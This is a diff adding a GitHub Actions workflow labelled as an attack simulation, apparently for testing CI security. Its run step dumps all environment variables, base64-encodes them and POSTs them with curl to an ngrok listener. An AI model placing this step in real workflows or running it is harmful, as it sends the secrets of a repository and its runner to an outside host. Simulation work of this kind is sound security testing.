@@ -1,0 +1,20 @@
+name: Attack A2 Simulation
+on: [workflow_dispatch]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Simulate Script Download and Execute (A2)
+        env:
+          DUMMY_SECRET: "canary-secret-$(openssl rand -hex 8)"
+        run: |
+          # Simulating downloading and executing a compromised script
+          echo "Downloading and running remote script..."
+          
+          # Simulating exfiltration of environment variables to your listener
+          PAYLOAD=$(env | base64)
+          curl -X POST -d "env=$PAYLOAD" https://shortage-euphemism-gleeful.ngrok-free.dev/listener
